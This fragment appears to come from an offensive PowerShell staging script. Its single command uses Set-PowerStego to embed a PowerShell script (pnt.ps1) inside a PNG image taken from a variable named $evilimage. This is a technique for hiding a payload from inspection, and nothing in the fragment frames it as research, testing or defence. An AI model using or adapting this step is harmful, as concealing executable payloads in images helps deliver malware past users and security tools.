...
Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath $evilimage -ImageDestinationPath .\png\image.png -PayloadSource Text -PayloadPath $ScriptDir\Package\bat\pnt.ps1
